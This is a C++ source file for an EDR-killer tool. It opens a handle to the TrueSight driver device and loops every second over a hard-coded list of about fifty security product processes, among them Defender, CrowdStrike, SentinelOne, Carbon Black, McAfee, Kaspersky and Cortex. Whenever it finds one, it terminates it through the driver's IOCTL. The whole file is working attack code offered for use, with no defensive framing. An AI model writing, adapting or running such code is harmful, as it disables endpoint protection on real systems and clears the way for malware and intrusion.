// truesight.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <signal.h>

#define DRIVER_NAME L"truesight"
#define IOCTL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) // 0x22E044

const wchar_t* edrNames[] = { L"MsMpEng.exe", L"SecurityHealthService.exe", L"SecurityHealthSystray.exe", L"MsSense.exe", L"SenseNdr.exe", L"SenseTVM.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"MpSigStub.exe", L"ConfigSecurityPolicy.exe", L"smartscreen.exe", L"CSFalconService.exe", L"CSFalconContainer.exe", L"CSAgent.exe", L"falcon-sensor.exe", L"SentinelAgent.exe", L"SentinelAgentWorker.exe", L"SentinelServiceHost.exe", L"SentinelStaticEngine.exe", L"cb.exe", L"cbstream.exe", L"carbonblack.exe", L"RepMgr.exe", L"RepUtils.exe", L"RepUx.exe", L"ccSvcHst.exe", L"SymCorpUI.exe", L"SEPM.exe", L"SmcGui.exe", L"smc.exe", L"ccApp.exe", L"McShield.exe", L"mfevtps.exe", L"mfeann.exe", L"mcapexe.exe", L"ModuleCoreService.exe", L"mfemms.exe", L"PccNTMon.exe", L"ntrtscan.exe", L"tmlisten.exe", L"CNTAoSMgr.exe", L"TmCCSF.exe", L"avp.exe", L"kavtray.exe", L"klnagent.exe", L"ksde.exe", L"cytray.exe", L"cyserver.exe", L"CyveraService.exe", L"xagt.exe", L"fe_avk.exe", L"HX.exe" };

const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

// Function to find the PID of a process by its name
DWORD FindEDR(const wchar_t* processName) {
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD processId = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return NULL;
    }
    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            processId = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);

    return processId;
}

int wmain(int argc, wchar_t* argv[])
{

    printf("[+] Opening handle to device..\n");
    HANDLE hDriver = CreateFileW(
        L"\\\\.\\TrueSight", 
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open handle: %d", GetLastError());
        return 1;
    }

    while (true) {
        for (size_t i = 0; i < edrCount; i++) {

            // Find EDR PID
            DWORD EDRPID = 0;
            EDRPID = FindEDR(edrNames[i]);

            if (EDRPID != 0) {

                wprintf(L"[+] Calling ProcessTerminator to Kill %ls with PID: %d....", edrNames[i], EDRPID);

                // Terminate EDR
                NTSTATUS success = DeviceIoControl(
                    hDriver,
                    IOCTL_CODE,
                    &EDRPID,
                    sizeof(EDRPID),
                    nullptr,
                    0,
                    nullptr,
                    nullptr);

                if (success) {
                    printf("success\n");
                }
                else {
                    printf("failed\n");
                }
            }

        }

        Sleep(1000);
    }

    CloseHandle(hDriver);

    return 0;
}